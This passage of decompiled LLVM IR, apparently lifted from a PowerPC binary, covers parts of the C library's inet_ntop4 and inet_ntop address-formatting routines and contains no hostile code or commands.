  br label %dec_label_pc_10014b94

dec_label_pc_10014b8c:                            ; preds = %dec_label_pc_10014b48
  br i1 %v4_10014b8c, label %dec_label_pc_10014b94, label %dec_label_pc_10014bc0

dec_label_pc_10014b94:                            ; preds = %dec_label_pc_10014b8c.thread, %dec_label_pc_10014b8c
  %v0_10014b94 = load i32, i32* @r22, align 4
  store i32 %v0_10014b94, i32* @r3, align 4
  store i32 %v2_10014a10, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10014ba4.719 to i32), i32* @lr, align 4
  %v0_10014ba0 = call i32 @memcpy()
  store i32 %v0_10014ba0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bc4

dec_label_pc_10014bac:                            ; preds = %dec_label_pc_100149f0
  %v0_10014bac = call i32 @__errno_location()
  store i32 %v0_10014bac, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10014bb8 = inttoptr i32 %v0_10014bac to i32*
  store i32 97, i32* %v2_10014bb8, align 4
  %v0_10014bc8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bc4

dec_label_pc_10014bc0:                            ; preds = %dec_label_pc_10014ab4, %dec_label_pc_10014aa8, %dec_label_pc_10014a6c, %dec_label_pc_10014a94, %dec_label_pc_10014b50, %dec_label_pc_10014af4, %dec_label_pc_10014ae0, %dec_label_pc_10014b8c, %dec_label_pc_10014a34, %dec_label_pc_10014b2c, %dec_label_pc_10014ae8
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014bc4

dec_label_pc_10014bc4:                            ; preds = %dec_label_pc_10014bac, %dec_label_pc_10014b94, %dec_label_pc_100149fc, %dec_label_pc_10014bc0
  %v0_10014bc8 = phi i32 [ %v0_10014bc8.pre, %dec_label_pc_10014bac ], [ 1, %dec_label_pc_10014b94 ], [ %v3_10014a04, %dec_label_pc_100149fc ], [ 0, %dec_label_pc_10014bc0 ]
  store i32 %v0_100149d4, i32* %r0.global-to-local, align 4
  store i32 %v0_10014bc8, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014bc8

; uselistorder directives
  uselistorder i32 %v0_10014bc8, { 1, 0 }
  uselistorder i32 %v2_10014b78, { 1, 0 }
  uselistorder i32 %v0_10014b74.pre, { 0, 2, 1, 3 }
  uselistorder i1 %v4_10014b8c, { 1, 0 }
  uselistorder i32 %v0_10014b8c.pre, { 1, 0 }
  uselistorder i32 %v0_10014b38, { 1, 0 }
  uselistorder i32 %v0_10014b8c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v1_10014b18, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10014ac0, { 1, 0 }
  uselistorder i32 %v1_10014a70, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 13, 14, 10, 11, 2, 1, 12, 4, 3, 15, 16, 17, 18, 0 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0 }
  uselistorder i32 58, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32)* @__GI_tolower, { 2, 1, 0 }
  uselistorder i32 268520220, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_10014bc4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10014bc0, { 7, 4, 9, 5, 10, 6, 0, 1, 3, 2, 8 }
  uselistorder label %dec_label_pc_10014b94, { 1, 0 }
  uselistorder label %dec_label_pc_10014b68, { 1, 0 }
  uselistorder label %dec_label_pc_10014b48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014b24, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10014a4c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10014a4c, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10014c34.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %stack_var_-54 = alloca i32, align 4
  %v0_10014bdc = load i32, i32* @lr, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg3, i32* @r30, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r5.global-to-local, align 4
  %v2_10014c08 = ptrtoint i32* %stack_var_-54 to i32
  store i32 %v2_10014c08, i32* %r3.global-to-local, align 4
  store i32 100, i32* @r28, align 4
  store i16 0, i16* %stack_var_-56, align 2
  store i32 ptrtoint (i32* @global_var_10014c18.722 to i32), i32* @lr, align 4
  %v3_10014c14 = call i32 @__GI_memset(i32 %v2_10014c08, i32 0, i32 15)
  store i32 %v3_10014c14, i32* %r3.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 46, i32* %r12.global-to-local, align 4
  %v0_10014cd82 = load i32, i32* @r1, align 4
  store i32 %v0_10014cd82, i32* %r7.global-to-local, align 4
  store i32 4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014c34

dec_label_pc_10014c34:                            ; preds = %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge, %dec_label_pc_10014c34.lr.ph
  %v2_10014c54 = phi i32 [ %v2_10014cd8, %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge ], [ %v0_10014cd82, %dec_label_pc_10014c34.lr.ph ]
  %v0_10014c48 = phi i32 [ %v0_10014cd8, %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge ], [ %v0_10014cd82, %dec_label_pc_10014c34.lr.ph ]
  %v0_10014c38 = phi i32 [ %v1_10014cd8, %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge ], [ 0, %dec_label_pc_10014c34.lr.ph ]
  %v1_10014c40 = phi i32 [ %v1_10014c34.pre, %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge ], [ 0, %dec_label_pc_10014c34.lr.ph ]
  %v0_10014c34 = load i32, i32* %r31.global-to-local, align 4
  %v2_10014c34 = add i32 %v0_10014c34, %v1_10014c40
  %v3_10014c34 = inttoptr i32 %v2_10014c34 to i8*
  %v4_10014c34 = load i8, i8* %v3_10014c34, align 1
  %v5_10014c34 = zext i8 %v4_10014c34 to i32
  store i32 %v5_10014c34, i32* %r10.global-to-local, align 4
  store i32 %v0_10014c38, i32* %r8.global-to-local, align 4
  %v1_10014c3c = add i32 %v0_10014c38, 1
  store i32 %v1_10014c3c, i32* %r11.global-to-local, align 4
  store i32 %v2_10014c34, i32* %r3.global-to-local, align 4
  %v1_10014c44 = load i32, i32* @r28, align 4
  %v2_10014c44 = udiv i32 %v5_10014c34, %v1_10014c44
  %v2_10014c48 = add i32 %v1_10014c3c, %v0_10014c48
  store i32 %v2_10014c48, i32* %r6.global-to-local, align 4
  %v1_10014c4c = add nuw nsw i32 %v2_10014c44, 48
  %v1_10014c50 = urem i32 %v1_10014c4c, 256
  store i32 %v1_10014c50, i32* %r0.global-to-local, align 4
  %v1_10014c54 = trunc i32 %v1_10014c4c to i8
  %v3_10014c54 = add i32 %v2_10014c54, 8
  %v4_10014c54 = inttoptr i32 %v3_10014c54 to i8*
  store i8 %v1_10014c54, i8* %v4_10014c54, align 1
  %v0_10014c58 = load i32, i32* %r0.global-to-local, align 4
  %v3_10014c58 = icmp eq i32 %v0_10014c58, 48
  %v0_10014c60 = load i32, i32* %r10.global-to-local, align 4
  %v1_10014c60 = load i32, i32* %r5.global-to-local, align 4
  %v2_10014c60 = udiv i32 %v0_10014c60, %v1_10014c60
  store i32 %v2_10014c60, i32* %r9.global-to-local, align 4
  br i1 %v3_10014c58, label %dec_label_pc_10014c60, label %dec_label_pc_10014c8c

dec_label_pc_10014c60:                            ; preds = %dec_label_pc_10014c34
  %v2_10014c64 = udiv i32 %v2_10014c60, %v1_10014c60
  %tmp18 = mul i32 %v2_10014c64, -10
  %v2_10014c6c = add i32 %v2_10014c60, 48
  %v1_10014c70 = add i32 %v2_10014c6c, %tmp18
  store i32 %v1_10014c70, i32* %r9.global-to-local, align 4
  %v1_10014c74 = urem i32 %v1_10014c70, 256
  store i32 %v1_10014c74, i32* %r0.global-to-local, align 4
  %v1_10014c78 = trunc i32 %v1_10014c70 to i8
  %v2_10014c78 = load i32, i32* %r7.global-to-local, align 4
  %v3_10014c78 = add i32 %v2_10014c78, 8
  %v4_10014c78 = inttoptr i32 %v3_10014c78 to i8*
  store i8 %v1_10014c78, i8* %v4_10014c78, align 1
  %v0_10014c7c = load i32, i32* %r0.global-to-local, align 4
  %v3_10014c7c = icmp eq i32 %v0_10014c7c, 48
  br i1 %v3_10014c7c, label %dec_label_pc_10014ca8, label %dec_label_pc_10014c84

dec_label_pc_10014c84:                            ; preds = %dec_label_pc_10014c60
  %v0_10014c84 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10014c84, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10014ca8

dec_label_pc_10014c8c:                            ; preds = %dec_label_pc_10014c34
  %v0_10014c90 = load i32, i32* %r11.global-to-local, align 4
  %v1_10014c90 = add i32 %v0_10014c90, 1
  store i32 %v1_10014c90, i32* %r8.global-to-local, align 4
  %v2_10014c94 = udiv i32 %v2_10014c60, %v1_10014c60
  %v1_10014c98 = mul i32 %v2_10014c94, 10
  store i32 %v1_10014c98, i32* %r0.global-to-local, align 4
  %v2_10014c9c = sub i32 %v2_10014c60, %v1_10014c98
  %v1_10014ca0 = add i32 %v2_10014c9c, 48
  store i32 %v1_10014ca0, i32* %r9.global-to-local, align 4
  %v1_10014ca4 = trunc i32 %v1_10014ca0 to i8
  %v2_10014ca4 = load i32, i32* %r6.global-to-local, align 4
  %v3_10014ca4 = add i32 %v2_10014ca4, 8
  %v4_10014ca4 = inttoptr i32 %v3_10014ca4 to i8*
  store i8 %v1_10014ca4, i8* %v4_10014ca4, align 1
  br label %dec_label_pc_10014ca8

dec_label_pc_10014ca8:                            ; preds = %dec_label_pc_10014c60, %dec_label_pc_10014c84, %dec_label_pc_10014c8c
  %v0_10014ca8 = load i32, i32* %r3.global-to-local, align 4
  %v1_10014ca8 = inttoptr i32 %v0_10014ca8 to i8*
  %v2_10014ca8 = load i8, i8* %v1_10014ca8, align 1
  %v3_10014ca8 = zext i8 %v2_10014ca8 to i32
  %v0_10014cac = load i32, i32* %r8.global-to-local, align 4
  %v1_10014cac = add i32 %v0_10014cac, 1
  %v0_10014cb0 = load i32, i32* @r1, align 4
  %v2_10014cb0 = add i32 %v0_10014cb0, %v0_10014cac
  store i32 %v2_10014cb0, i32* %r10.global-to-local, align 4
  %v2_10014cb4 = add i32 %v1_10014cac, %v0_10014cb0
  store i32 %v2_10014cb4, i32* %r8.global-to-local, align 4
  %v1_10014cb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_10014cb8 = udiv i32 %v3_10014ca8, %v1_10014cb8
  %v1_10014cbc = add i32 %v0_10014cac, 2
  store i32 %v1_10014cbc, i32* %r11.global-to-local, align 4
  %v0_10014cc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_10014cc0 = add i32 %v0_10014cc0, 1
  store i32 %v1_10014cc0, i32* %r4.global-to-local, align 4
  %v1_10014cc4 = mul nuw nsw i32 %v2_10014cb8, 10
  store i32 %v1_10014cc4, i32* %r0.global-to-local, align 4
  %v2_10014cc8 = sub nsw i32 %v3_10014ca8, %v1_10014cc4
  %v1_10014ccc = add nsw i32 %v2_10014cc8, 48
  store i32 %v1_10014ccc, i32* %r9.global-to-local, align 4
  %v1_10014cd0 = trunc i32 %v1_10014ccc to i8
  %v3_10014cd0 = add i32 %v2_10014cb0, 8
  %v4_10014cd0 = inttoptr i32 %v3_10014cd0 to i8*
  store i8 %v1_10014cd0, i8* %v4_10014cd0, align 1
  %v0_10014cd4 = load i32, i32* %r12.global-to-local, align 4
  %v1_10014cd4 = trunc i32 %v0_10014cd4 to i8
  %v2_10014cd4 = load i32, i32* %r8.global-to-local, align 4
  %v3_10014cd4 = add i32 %v2_10014cd4, 8
  %v4_10014cd4 = inttoptr i32 %v3_10014cd4 to i8*
  store i8 %v1_10014cd4, i8* %v4_10014cd4, align 1
  %v0_10014cd8 = load i32, i32* @r1, align 4
  %v1_10014cd8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014cd8 = add i32 %v1_10014cd8, %v0_10014cd8
  store i32 %v2_10014cd8, i32* %r7.global-to-local, align 4
  %v0_10014cdc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014cdc = add i32 %v0_10014cdc, -1
  store i32 %v1_10014cdc, i32* %ctr.global-to-local, align 4
  %v2_10014cdc = icmp eq i32 %v1_10014cdc, 0
  br i1 %v2_10014cdc, label %dec_label_pc_10014ce0, label %dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge

dec_label_pc_10014ca8.dec_label_pc_10014c34_crit_edge: ; preds = %dec_label_pc_10014ca8
  %v1_10014c34.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10014c34

dec_label_pc_10014ce0:                            ; preds = %dec_label_pc_10014ca8
  %v2_10014ce0 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_10014ce0, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10014ce8 = add i32 %v1_10014cd8, %v2_10014ce0
  store i32 %v2_10014ce8, i32* %r9.global-to-local, align 4
  store i32 %v2_10014ce0, i32* @r3, align 4
  %v3_10014cf0 = add i32 %v2_10014ce8, -1
  %v4_10014cf0 = inttoptr i32 %v3_10014cf0 to i8*
  store i8 0, i8* %v4_10014cf0, align 1
  %v0_10014cf4 = call i32 @__GI_strlen()
  store i32 %v0_10014cf4, i32* %r3.global-to-local, align 4
  %v1_10014cf8 = load i32, i32* @r30, align 4
  %v3_10014cf8 = icmp ugt i32 %v0_10014cf4, %v1_10014cf8
  br i1 %v3_10014cf8, label %dec_label_pc_10014d00, label %dec_label_pc_10014d14

dec_label_pc_10014d00:                            ; preds = %dec_label_pc_10014ce0
  %v0_10014d00 = call i32 @__errno_location()
  store i32 %v0_10014d00, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10014d0c = inttoptr i32 %v0_10014d00 to i32*
  store i32 28, i32* %v2_10014d0c, align 4
  %v0_10014d28.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014d24

dec_label_pc_10014d14:                            ; preds = %dec_label_pc_10014ce0
  %v0_10014d14 = load i32, i32* @r29, align 4
  store i32 %v0_10014d14, i32* %r3.global-to-local, align 4
  store i32 %v2_10014ce0, i32* %r4.global-to-local, align 4
  %v2_10014d1c = bitcast i16* %stack_var_-56 to i8*
  %v3_10014d1c = call i32 @strcpy(i32 %v0_10014d14, i8* %v2_10014d1c)
  store i32 %v3_10014d1c, i32* %r3.global-to-local, align 4
  store i32 %v3_10014d1c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014d24

dec_label_pc_10014d24:                            ; preds = %dec_label_pc_10014d00, %dec_label_pc_10014d14
  %v0_10014d28 = phi i32 [ %v0_10014d28.pre, %dec_label_pc_10014d00 ], [ %v3_10014d1c, %dec_label_pc_10014d14 ]
  store i32 %v0_10014bdc, i32* %r0.global-to-local, align 4
  store i32 %v0_10014d28, i32* %r3.global-to-local, align 4
  ret i32 %v0_10014d28

; uselistorder directives
  uselistorder i32 %v0_10014d28, { 1, 0 }
  uselistorder i32 %v2_10014ce0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10014cdc, { 1, 0 }
  uselistorder i32 %v2_10014cd8, { 1, 0 }
  uselistorder i32 %v0_10014cac, { 1, 0, 2 }
  uselistorder i32 %v1_10014c70, { 1, 0, 2 }
  uselistorder i32 %v2_10014c60, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10014c4c, { 1, 0 }
  uselistorder i32 %v0_10014c38, { 1, 0 }
  uselistorder i32 %v0_10014cd82, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32 15, { 0, 3, 5, 6, 1, 8, 9, 7, 2, 4 }
  uselistorder i32 268566528, { 38, 40, 41, 39, 0, 42, 43, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 15, 18, 14, 19, 13, 20, 12, 21, 11, 22, 10, 23, 9, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder label %dec_label_pc_10014d24, { 1, 0 }
  uselistorder label %dec_label_pc_10014ca8, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_10014d3c = icmp slt i32 %arg1, 2
  %v3_10014d3c = icmp eq i32 %arg1, 2
  store i1 %v1_10014d3c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014d3c, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_10014d3c, label %dec_label_pc_10014d6c, label %dec_label_pc_10014d60

dec_label_pc_10014d60:                            ; preds = %entry
  %v1_10014d60 = icmp slt i32 %arg1, 10
  %v3_10014d60 = icmp eq i32 %arg1, 10
  store i1 %v1_10014d60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014d60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014d60, label %dec_label_pc_10014da4.lr.ph, label %dec_label_pc_10014fb8

dec_label_pc_10014d6c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10014d7c.724 to i32), i32* @lr, align 4
  %v3_10014d78 = call i32 @inet_ntop4(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_10014fb0

dec_label_pc_10014da4.lr.ph:                      ; preds = %dec_label_pc_10014d60
  %v2_10014d80 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10014d80, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10014d94.725 to i32), i32* @lr, align 4
  %v3_10014d90 = call i32 @__GI_memset(i32 %v2_10014d80, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10014dc415 = load i32, i32* @r27, align 4
  store i32 %v0_10014dc415, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014da4

dec_label_pc_10014da4:                            ; preds = %dec_label_pc_10014da4.lr.ph, %dec_label_pc_10014da4
  %v1_10014db8 = phi i32 [ 0, %dec_label_pc_10014da4.lr.ph ], [ %v1_10014dc8, %dec_label_pc_10014da4 ]
  %v0_10014da4 = phi i32 [ %v0_10014dc415, %dec_label_pc_10014da4.lr.ph ], [ %v0_10014dc4, %dec_label_pc_10014da4 ]
  %v0_10014dac = phi i32 [ %v0_10014dc415, %dec_label_pc_10014da4.lr.ph ], [ %v2_10014dc4, %dec_label_pc_10014da4 ]
  %v1_10014da4 = phi i32 [ 0, %dec_label_pc_10014da4.lr.ph ], [ %v0_10014dbc, %dec_label_pc_10014da4 ]
  %v2_10014da4 = add i32 %v0_10014da4, %v1_10014da4
  %v3_10014da4 = inttoptr i32 %v2_10014da4 to i8*
  %v4_10014da4 = load i8, i8* %v3_10014da4, align 1
  %v5_10014da4 = zext i8 %v4_10014da4 to i32
  %v1_10014da8 = add i32 %v1_10014da4, 2
  store i32 %v1_10014da8, i32* %r11.global-to-local, align 4
  %v1_10014dac = add i32 %v0_10014dac, 1
  %v2_10014dac = inttoptr i32 %v1_10014dac to i8*
  %v3_10014dac = load i8, i8* %v2_10014dac, align 1
  %v4_10014dac = zext i8 %v3_10014dac to i32
  %v1_10014db0 = mul nuw nsw i32 %v5_10014da4, 256
  %v2_10014db4 = or i32 %v4_10014dac, %v1_10014db0
  %v2_10014db8 = load i32, i32* %r29.global-to-local, align 4
  %v3_10014db8 = add i32 %v2_10014db8, %v1_10014db8
  %v4_10014db8 = inttoptr i32 %v3_10014db8 to i32*
  store i32 %v2_10014db4, i32* %v4_10014db8, align 4
  %v0_10014dbc = load i32, i32* %r11.global-to-local, align 4
  %v1_10014dbc = udiv i32 %v0_10014dbc, 2
  %v0_10014dc4 = load i32, i32* @r27, align 4
  %v2_10014dc4 = add i32 %v0_10014dc4, %v0_10014dbc
  store i32 %v2_10014dc4, i32* %r9.global-to-local, align 4
  %v1_10014dc8 = mul i32 %v1_10014dbc, 4
  %v0_10014dcc = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014dcc = add i32 %v0_10014dcc, -1
  store i32 %v1_10014dcc, i32* %ctr.global-to-local, align 4
  %v2_10014dcc = icmp eq i32 %v1_10014dcc, 0
  br i1 %v2_10014dcc, label %dec_label_pc_10014dec.lr.ph, label %dec_label_pc_10014da4

dec_label_pc_10014dec.lr.ph:                      ; preds = %dec_label_pc_10014da4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10014dec

dec_label_pc_10014dec:                            ; preds = %dec_label_pc_10014dec.lr.ph, %dec_label_pc_10014e38
  %v0_10014e3c = phi i32 [ 8, %dec_label_pc_10014dec.lr.ph ], [ %v1_10014e3c, %dec_label_pc_10014e38 ]
  %v0_10014e2c = phi i32 [ -1, %dec_label_pc_10014dec.lr.ph ], [ %v0_10014e2c42, %dec_label_pc_10014e38 ]
  %v0_10014e1c = phi i32 [ -1, %dec_label_pc_10014dec.lr.ph ], [ %v0_10014e1c39, %dec_label_pc_10014e38 ]
  %v0_10014df0 = phi i32 [ -1, %dec_label_pc_10014dec.lr.ph ], [ %v0_10014df035, %dec_label_pc_10014e38 ]
  %v0_10014e38 = phi i32 [ 0, %dec_label_pc_10014dec.lr.ph ], [ %v1_10014e38, %dec_label_pc_10014e38 ]
  %v1_10014dec = mul i32 %v0_10014e38, 4
  %v3_10014df0 = icmp eq i32 %v0_10014df0, -1
  %v2_10014df4 = add i32 %v1_10014dec, %v2_10014d80
  %v3_10014df4 = inttoptr i32 %v2_10014df4 to i32*
  %v4_10014df4 = load i32, i32* %v3_10014df4, align 4
  %v3_10014df8 = icmp eq i32 %v4_10014df4, 0
  br i1 %v3_10014df8, label %dec_label_pc_10014e00, label %dec_label_pc_10014e18

dec_label_pc_10014e00:                            ; preds = %dec_label_pc_10014dec
  br i1 %v3_10014df0, label %dec_label_pc_10014e04, label %dec_label_pc_10014e10

dec_label_pc_10014e04:                            ; preds = %dec_label_pc_10014e00
  store i32 %v0_10014e38, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_10014e38

dec_label_pc_10014e10:                            ; preds = %dec_label_pc_10014e00
  %v0_10014e10 = load i32, i32* @r31, align 4
  %v1_10014e10 = add i32 %v0_10014e10, 1
  store i32 %v1_10014e10, i32* @r31, align 4
  br label %dec_label_pc_10014e38

dec_label_pc_10014e18:                            ; preds = %dec_label_pc_10014dec
  br i1 %v3_10014df0, label %dec_label_pc_10014e38, label %dec_label_pc_10014e1c

dec_label_pc_10014e1c:                            ; preds = %dec_label_pc_10014e18
  %v3_10014e1c = icmp eq i32 %v0_10014e1c, -1
  %v0_10014e30.pre = load i32, i32* @r31, align 4
  %v1_10014e24 = load i32, i32* @r30, align 4
  %v3_10014e24 = icmp sgt i32 %v0_10014e30.pre, %v1_10014e24
  %or.cond = or i1 %v3_10014e1c, %v3_10014e24
  br i1 %or.cond, label %dec_label_pc_10014e2c, label %dec_label_pc_10014e34

dec_label_pc_10014e2c:                            ; preds = %dec_label_pc_10014e1c
  store i32 %v0_10014e2c, i32* @r28, align 4
  store i32 %v0_10014e30.pre, i32* @r30, align 4
  br label %dec_label_pc_10014e34

dec_label_pc_10014e34:                            ; preds = %dec_label_pc_10014e1c, %dec_label_pc_10014e2c
  %v0_10014e1c40 = phi i32 [ %v0_10014e2c, %dec_label_pc_10014e2c ], [ %v0_10014e1c, %dec_label_pc_10014e1c ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10014e38

dec_label_pc_10014e38:                            ; preds = %dec_label_pc_10014e18, %dec_label_pc_10014e10, %dec_label_pc_10014e04, %dec_label_pc_10014e34
  %v0_10014e2c42 = phi i32 [ %v0_10014e2c, %dec_label_pc_10014e18 ], [ %v0_10014e2c, %dec_label_pc_10014e10 ], [ %v0_10014e38, %dec_label_pc_10014e04 ], [ -1, %dec_label_pc_10014e34 ]
  %v0_10014df035 = phi i32 [ -1, %dec_label_pc_10014e18 ], [ %v0_10014df0, %dec_label_pc_10014e10 ], [ %v0_10014e38, %dec_label_pc_10014e04 ], [ -1, %dec_label_pc_10014e34 ]
  %v0_10014e1c39 = phi i32 [ %v0_10014e1c, %dec_label_pc_10014e18 ], [ %v0_10014e1c, %dec_label_pc_10014e10 ], [ %v0_10014e1c, %dec_label_pc_10014e04 ], [ %v0_10014e1c40, %dec_label_pc_10014e34 ]
  %v1_10014e38 = add nuw nsw i32 %v0_10014e38, 1
  store i32 %v1_10014e38, i32* %r11.global-to-local, align 4
  %v1_10014e3c = add nsw i32 %v0_10014e3c, -1
  store i32 %v1_10014e3c, i32* %ctr.global-to-local, align 4
  %v2_10014e3c = icmp eq i32 %v1_10014e3c, 0
  br i1 %v2_10014e3c, label %dec_label_pc_10014e40, label %dec_label_pc_10014dec

dec_label_pc_10014e40:                            ; preds = %dec_label_pc_10014e38
  %v3_10014e40 = icmp eq i32 %v0_10014e2c42, -1
  %v1_10014e60 = icmp slt i32 %v0_10014e1c39, -1
  %v3_10014e60 = icmp eq i32 %v0_10014e1c39, -1
  store i1 %v1_10014e60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e60, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014e40, label %dec_label_pc_10014e60, label %dec_label_pc_10014e48

dec_label_pc_10014e48:                            ; preds = %dec_label_pc_10014e40
  %v0_10014e58.pre = load i32, i32* @r31, align 4
  br i1 %v3_10014e60, label %dec_label_pc_10014e58, label %dec_label_pc_10014e50

dec_label_pc_10014e50:                            ; preds = %dec_label_pc_10014e48
  %v1_10014e50 = load i32, i32* @r30, align 4
  %v2_10014e50 = icmp slt i32 %v0_10014e58.pre, %v1_10014e50
  %v3_10014e50 = icmp sgt i32 %v0_10014e58.pre, %v1_10014e50
  %v4_10014e50 = icmp eq i32 %v0_10014e58.pre, %v1_10014e50
  store i1 %v2_10014e50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10014e50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10014e50, label %dec_label_pc_10014e58, label %dec_label_pc_10014e60.thread

dec_label_pc_10014e58:                            ; preds = %dec_label_pc_10014e48, %dec_label_pc_10014e50
  store i32 %v0_10014e58.pre, i32* @r30, align 4
  store i32 %v0_10014e2c42, i32* @r28, align 4
  br label %dec_label_pc_10014e60.thread

dec_label_pc_10014e60.thread:                     ; preds = %dec_label_pc_10014e58, %dec_label_pc_10014e50
  %v0_10014e6876 = phi i32 [ %v1_10014e50, %dec_label_pc_10014e50 ], [ %v0_10014e58.pre, %dec_label_pc_10014e58 ]
  %v0_10014e60.ph = phi i32 [ %v0_10014e1c39, %dec_label_pc_10014e50 ], [ %v0_10014e2c42, %dec_label_pc_10014e58 ]
  %v1_10014e6059 = icmp slt i32 %v0_10014e60.ph, -1
  %v3_10014e6061 = icmp eq i32 %v0_10014e60.ph, -1
  store i1 %v1_10014e6059, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10014e6061, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10014e68

